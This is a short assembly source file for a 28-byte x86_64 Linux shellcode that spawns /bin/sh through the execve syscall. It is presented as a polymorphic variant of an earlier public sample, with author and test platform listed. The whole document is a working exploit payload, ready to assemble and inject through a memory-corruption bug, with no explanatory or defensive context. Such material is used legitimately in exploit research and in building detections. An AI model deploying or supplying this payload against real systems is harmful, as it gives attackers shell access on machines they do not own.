; Linux/x86_64 execve("/bin/sh"); 28 bytes shellcode
; Date: 20/10/2014
; Author: Javier Tejedor. Polimorphic version of zbt (http://shell-storm.org/shellcode/files/shellcode-603.php)
; Tested on: x86_64 Ubuntu 12.04 GNU/Linux

; execve("/bin/sh", NULL, NULL)

section .text
	global _start

_start:
	xor	rsi, rsi
	mov	rdx, rsi
	mov     qword rbx, '//bin/sh'
	shr     rbx, 0x8
	push    rbx
	mov     rdi, rsp
	mov     al, 0x3b
	syscall
